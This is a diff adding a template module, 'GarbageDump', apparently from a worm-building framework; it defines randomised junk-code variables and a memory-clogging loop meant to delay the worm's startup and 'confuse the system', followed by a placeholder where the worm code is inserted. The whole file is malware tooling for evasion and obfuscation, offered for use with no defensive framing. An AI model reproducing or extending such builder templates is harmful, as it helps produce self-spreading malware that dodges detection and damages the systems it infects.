@@ -1,0 +1,15 @@
+#!name##GarbageDump
+#!types##starter
+#!info##It generates a function that is a loop that slows down and clogs up memory. It delays the startup of the worm, which can confuse the system.
+#!garbageVar##GD_Trash1##128##randC##Size of junk code in kB. Too high a value slows down compilation and execution.
+#!garbageVar##GD_Trash2##192##randC##Size of junk code in kB. Too high a value slows down compilation and execution.
+
+
+
+{{GD_Trash1}} = "{{GD_Trash2}}"
+xcvb{{GD_Trash1}} = {}
+for {{GD_Trash1}}{{GD_Trash2}} in {{GD_Trash1}}:
+    xcvb{{GD_Trash1}}["{{GD_Trash1}}{{GD_Trash2}}"] = "{{GD_Trash2}}" * len(xcvb{{GD_Trash1}})
+    if len(xcvb{{GD_Trash1}}["{{GD_Trash1}}{{GD_Trash2}}"]) != "{{GD_Trash2}}" * len(xcvb{{GD_Trash1}}):
+        xcvb{{GD_Trash1}}["{{GD_Trash1}}{{GD_Trash2}}"] = "{{GD_Trash2}}" * len(xcvb{{GD_Trash1}}) * 3
+{{_WORM_CODE}}
